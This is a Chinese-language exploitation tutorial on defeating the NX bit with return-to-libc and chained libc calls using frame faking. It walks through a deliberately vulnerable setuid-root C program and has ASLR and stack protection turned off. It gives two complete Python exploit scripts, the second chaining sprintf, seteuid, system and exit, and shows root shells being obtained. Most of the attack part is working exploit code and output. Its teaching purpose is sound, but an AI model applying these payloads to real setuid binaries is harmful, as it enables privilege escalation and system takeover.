## Bypassing NX bit using chained return-to-libc

​	`NX Bit`是一种漏洞利用缓解技术，它使某些内存区域不可执行，并使可执行区域不可写。比如data，stack，heap segment不可执行，text segment 不可写。使用`NX Bit`后，基于栈的缓冲区溢出的方法将无法利用该漏洞。

​	存在漏洞的代码：

```c
//vuln.c
# include <stdio.h>
# include <string.h>

int main(int argc, char* argv[]) {
	char buf[256]; /* [1] */ 
	strcpy(buf,argv[1]); /* [2] */
 	printf("%s\n",buf); /* [3] */
 	fflush(stdout);  /* [4] */
	return 0;
}
```

​	编译代码(禁用ASLR；关闭栈保护；~~标记堆栈为可执行~~；ELF文件执行时获得root权限)：

```
#echo 0 > /proc/sys/kernel/randomize_va_space 
$gcc -g -fno-stack-protector -o vuln vuln.c 
$sudo chown root vuln 
$sudo chgrp root vuln 
$sudo chmod +s vuln
```

​	绕过`NX Bit`，可以使用称为`return-to-libc`的攻击技术。这里的返回地址被特定的libc函数地址覆盖（而非包含shellcode的栈地址）。例如，如果攻击者想要生成一个shell，他会用`system()`函数地址覆盖返回地址，并在栈中设置`system`函数所需的参数，使其成功调用。

​	首先，查看libc.so在内存中映射的基地址为0xb7e26000，如下所示：

```
(gdb) info proc mapping
process 14322
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/projects/vuln
	 0x8049000  0x804a000     0x1000        0x0 /home/user/projects/vuln
	 0x804a000  0x804b000     0x1000     0x1000 /home/user/projects/vuln
	0xb7e25000 0xb7e26000     0x1000        0x0 
	0xb7e26000 0xb7fc5000   0x19f000        0x0 /lib/i386-linux-gnu/libc-2.15.so
```

​	找到system函数的偏移量为0x0003d170，如下所示：

```
user@ubuntu:~/projects$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   239: 00119550    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   615: 0003d170   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1422: 0003d170   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

```

​	找到"/bin/sh"字符串的偏移量为0x0015cbe3：

```
user@ubuntu:~/projects$ strings -t x -a /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 15cbe3 /bin/sh
```

​	编写漏洞利用代码：

```python
# exp.py
# !/usr/bin/env python
import struct
from subprocess import call


# system address = libc base address + system offset
system = 0xB7E63170        # 0xb7e26000+0x0003d170
exit = 0xb7e54be0          # 0xb7e26000+0x00032fc0

# system arg = libc base address + "/bin/sh" str address
system_arg = 0xB7F82BE3

# endianess conversion
def conv(num):
    return struct.pack("<I", num)

# Junk + system + exit + system_arg
buf = "A" * 268
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print "Calling vulnerable program"
call(["./vuln", buf])
```

​	执行exploit成功拿到了root权限：

```
user@ubuntu:~/projects$ python exp.py 
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp1���K���+
# whoami
root
```

​	但在实际应用中，root setuid程序会采用**最小权限原则：该技术允许root setuid程序仅在需要时获得root权限，在不需要时放弃获得的root权限**。root setuid程序遵循的常规方法是在用户获取输入之前放弃root权限。因此，即使用户输入是恶意的，攻击者也不会获得root shell。例如，下面易受攻击的代码不会允许攻击者获得root shell：

```c
//vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
    char buf[256];
    seteuid(getuid()); /* Temporarily drop privileges */ 
 	strcpy(buf,argv[1]);
 	printf("%s\n",buf);
 	fflush(stdout);
 	return 0;
}
```

​	在这种情况下，调用`setuid(0)`函数可以恢复root权限。因此，可以按照以下顺序调用libc函数获得root shell：

* seteuid(0)
* system('/bin/sh')
* exit()

​    因为栈中需要同时存放函数地址和参数，需要用到`ESP Lifting`或`Frame Faking`技术（http://phrack.org/issues/58/4.html） 。这里采用**帧伪造技术：这种技术不是直接用libc函数地址覆盖返回地址，而是用 "leave ret" 指令覆盖。这允许攻击者将函数参数存储在栈中而不会发生重叠，从而允许调用多个libc函数。**

​	堆栈布局如下：

```
高地址			...
			 exit_arg
			 leave_ret
			 exit_addr   <------ func_3
		   --->	 fake_ebp3
		   |	 system_arg
		   |	 leave_ret
		   |	 system_addr <----- func_2
		   --->	 fake_ebp2
		   |	 seteuid_arg
		   |	 leave_ret
		   |	 setuid_addr <------ func_1
		   --->	 fake_ebp1
		   |	   XXXX
		   |	 leave_ret   <------ origin ret_addr
		   ---	 fake_ebp0	 <------ origin ebp
				   AAAA
				   AAAA
低地址				 ....
```

​	其对应的执行流程如下：

(1) 存在漏洞的函数的末尾指令`"leave ret"`会将`fake_ebp0`放入`%ebp`并返回到指令`"leave ret"`。

(2) 接下来，第二条指令`"leave ret"`会将`fake_ebp1`放入`%ebp`并返回到`func_1`。

(3) func_1执行，然后返回。

(4) 重复步骤 (2) 和 (3)，将 func_1替换为func_2，func_3，......func_n。 

因此，每个"leave ret" 指令都会调用它上面的libc函数。

​	另一个问题在于，seteuid参数为"0"，但"0"之后的字符不会被strcpy函数复制到栈中。**一种可行的方法是使用sprintf函数将NULL字节复制到seteuid_arg的栈地址。**



​	因此，按顺序使用下面的libc函数来解决上述的两个问题（其中调用4次sprintf函数为了设置seteuid_arg为0，每次覆盖一个字节)：	

```
sprintf | sprintf | sprintf | sprintf | seteuid | system | exit

对应的栈结构和ebp指向如下：

fake_ebp0	leave_ret	
    ↓
fake_ebp1	sprintf_addr	leave_ret	sprintf_arg1	sprintf_arg2	sprintf_arg3
    ↓
fake_ebp2	sprintf_addr	leave_ret	sprintf_arg1	sprintf_arg2	sprintf_arg3
    ↓
fake_ebp3	sprintf_addr	leave_ret	sprintf_arg1	sprintf_arg2	sprintf_arg3
    ↓
fake_ebp4	sprintf_addr	leave_ret	sprintf_arg1	sprintf_arg2	sprintf_arg3	XXXX
    ↓
fake_ebp5	seteuid_addr	leave_ret	YYYY(set zero)
    ↓
fake_ebp6	system_addr		leave_ret	system_arg
    ↓
fake_ebp7	exit_addr		leave_ret	exit_addr

```

​	编写漏洞利用代码：

```python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

fake_ebp0 = 0xbffffc10   # origin ebp's address: 0xbffffc08
fake_ebp1 = fake_ebp0 + 0x18
fake_ebp2 = fake_ebp1 + 0x18
fake_ebp3 = fake_ebp2 + 0x18
fake_ebp4 = fake_ebp3 + 0x1c
fake_ebp5 = fake_ebp4 + 0x10
fake_ebp6 = fake_ebp5 + 0x10
fake_ebp7 = fake_ebp6 + 0x10

# "(gdb)disassemble main" show leave_ret address
leave_ret = 0x0804851c

# "(gdb)info proc mapping" show libc_addr
libc_addr = 0xb7e26000

# "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system"
sprintf_addr = 0xB7E70C80 # 0004ac80 + 0xb7e26000
seteuid_addr = 0xB7F09660 # 000e3660 + 0xb7e26000
system_addr = 0xB7E63170
exit_addr = 0xb7e54be0

sprintf_arg1 = fake_ebp4 + 0xc # seteuid_arg address
sprintf_arg2 = 0x80495f0 # "%s"
sprintf_arg3 = 0xbffffffc # point to the null byte

# system_arg = "sh" str address in memory
system_arg = 0x804929d
exit_arg = 0xffffffff

# endianess convertion
def conv(num):
      return struct.pack("<I",num)

buf = "A" * 264
buf += conv(fake_ebp0)
buf += conv(leave_ret)
# Below four stack frames are for sprintf (to setup seteuid arg )
buf += conv(fake_ebp1)
buf += conv(sprintf_addr)
buf += conv(leave_ret)
buf += conv(sprintf_arg1)
buf += conv(sprintf_arg2)
buf += conv(sprintf_arg3)
buf += conv(fake_ebp2)
buf += conv(sprintf_addr)
buf += conv(leave_ret)
sprintf_arg1 += 1
buf += conv(sprintf_arg1)
buf += conv(sprintf_arg2)
buf += conv(sprintf_arg3)
buf += conv(fake_ebp3)
buf += conv(sprintf_addr)
buf += conv(leave_ret)
sprintf_arg1 += 1
buf += conv(sprintf_arg1)
buf += conv(sprintf_arg2)
buf += conv(sprintf_arg3)
buf += conv(fake_ebp4)
buf += conv(sprintf_addr)
buf += conv(leave_ret)
sprintf_arg1 += 1
buf += conv(sprintf_arg1)
buf += conv(sprintf_arg2)
buf += conv(sprintf_arg3)
# Dummy - To avoid null byte in fake_ebp4.
buf += "X" * 4

# Below stack frame is for seteuid
buf += conv(fake_ebp5)
buf += conv(seteuid_addr)
buf += conv(leave_ret)
# Dummy - This arg is zero'd by above four sprintf calls
buf += "Y" * 4
# Below stack frame is for system
buf += conv(fake_ebp6)
buf += conv(system_addr)
buf += conv(leave_ret)
buf += conv(system_arg)
# Below stack frame is for exit
buf += conv(fake_ebp7)
buf += conv(exit_addr)
buf += conv(leave_ret)
buf += conv(exit_arg)

print "Calling vulnerable program"
call(["/home/user/projects/vuln", buf])
```

​	执行漏洞利用代码，完全绕过了NX位，得到了root shell：

```shell

user@ubuntu:~/projects$ python exp.py
Calling vulnerable program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����(���������������@���������������X���������������t���������������XXXX����`���YYYY����p1���������K������
# whoami
root

```

